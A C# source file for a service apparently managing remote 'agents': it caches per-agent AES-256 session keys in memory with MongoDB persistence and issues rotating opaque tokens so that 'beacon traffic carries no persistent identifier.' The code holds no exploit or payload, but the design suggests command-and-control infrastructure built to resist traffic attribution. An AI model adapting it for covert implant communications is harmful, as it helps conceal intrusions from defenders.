using System.Collections.Concurrent;
using System.Security.Cryptography;
using LibraNextgen.Service.Data;
using LibraNextgen.Service.Models;
using MongoDB.Driver;

namespace LibraNextgen.Service.Services;

/// <summary>
/// Holds per-agent AES-256 session keys with an in-memory cache backed by a
/// Mongo collection, so keys survive a server restart. The cache is the
/// authoritative hot path; Mongo is the durable store loaded once at startup.
///
/// Also issues opaque per-session channel tokens. The token (not the stable
/// agent id) is what agents send on the wire, so beacon traffic carries no
/// persistent identifier; tokens rotate on every registration.
/// </summary>
public class SessionKeyStore
{
    private readonly ConcurrentDictionary<string, byte[]> _cache = new();
    private readonly ConcurrentDictionary<string, string> _tokens = new(); // token -> agentId
    private readonly IMongoCollection<SessionKey> _collection;

    public SessionKeyStore(MongoDbContext context)
    {
        _collection = context.GetCollection<SessionKey>("session_keys");
    }

    /// <summary>Load all persisted keys into the in-memory cache (called at startup).</summary>
    public async Task LoadAsync(CancellationToken ct = default)
    {
        var all = await _collection.Find(FilterDefinition<SessionKey>.Empty).ToListAsync(ct);
        foreach (var s in all)
        {
            if (string.IsNullOrEmpty(s.Key)) continue;
            try
            {
                _cache[s.AgentId] = Convert.FromBase64String(s.Key);
            }
            catch
            {
                // Ignore malformed persisted entries.
            }
        }
    }

    public void Set(string agentId, byte[] key)
    {
        _cache[agentId] = key;

        // Best-effort durable write; the in-memory cache is authoritative.
        var doc = new SessionKey { AgentId = agentId, Key = Convert.ToBase64String(key) };
        _ = _collection.ReplaceOneAsync(
            Builders<SessionKey>.Filter.Eq(s => s.AgentId, agentId),
            doc,
            new ReplaceOptions { IsUpsert = true });
    }

    public bool TryGet(string agentId, out byte[]? key) => _cache.TryGetValue(agentId, out key);

    /// <summary>Issue a fresh opaque channel token for an agent session.</summary>
    public string IssueToken(string agentId)
    {
        var token = Convert.ToHexString(RandomNumberGenerator.GetBytes(16)).ToLowerInvariant();
        _tokens[token] = agentId;
        return token;
    }

    /// <summary>Resolve an opaque channel token to its agent id.</summary>
    public bool TryResolveToken(string token, out string? agentId) =>
        _tokens.TryGetValue(token, out agentId);

    public void Remove(string agentId)
    {
        _cache.TryRemove(agentId, out _);
        // Drop any tokens that mapped to this agent.
        foreach (var (token, mapped) in _tokens)
        {
            if (mapped == agentId) _tokens.TryRemove(token, out _);
        }
        _ = _collection.DeleteOneAsync(Builders<SessionKey>.Filter.Eq(s => s.AgentId, agentId));
    }
}
